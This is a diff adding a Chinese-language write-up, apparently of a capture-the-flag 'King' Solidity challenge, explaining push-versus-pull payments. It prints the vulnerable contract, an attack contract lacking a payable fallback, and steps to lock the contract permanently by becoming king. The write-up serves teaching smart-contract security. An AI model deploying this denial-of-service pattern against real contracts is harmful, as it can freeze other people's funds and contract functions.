@@ -1,0 +1,57 @@
+# King
+关于合约push和pull方式的区别
+```solidity
+pragma solidity ^0.4.18;
+
+import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
+
+contract King is Ownable {
+
+  address public king;
+  uint public prize;
+
+  function King() public payable {
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+}
+```
+
+### 代码分析
+```solidity
+function() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+```
+上述代码中，当需要交换king的时候，会向原来的king发送eth，然后将king交换给新的用户。注意`king.transfer(msg.value)`
+只有2300的gas，如果原来的king为一个合约，并且没有fallback方法，或有fallback方法但执行的代码太多或恶意代码事，
+那么它可以使该合约的交换king方法永远不能成功。
+
+### 攻击合约
+```solidity
+pragma solidity ^0.4.18;
+
+
+contract KingAttack {
+
+  function doYourThing(address _target) public payable {
+    if(!_target.call.value(msg.value)()) revert();
+  }
+
+  // OMG NO PAYABLE FALLBACK!!
+}
+```
+
+### 攻击方法
+1. 发布攻击合约
+2. 调用攻击合约doYourThing(address)，同时转让>1eth（原king的eth数量为1eth）
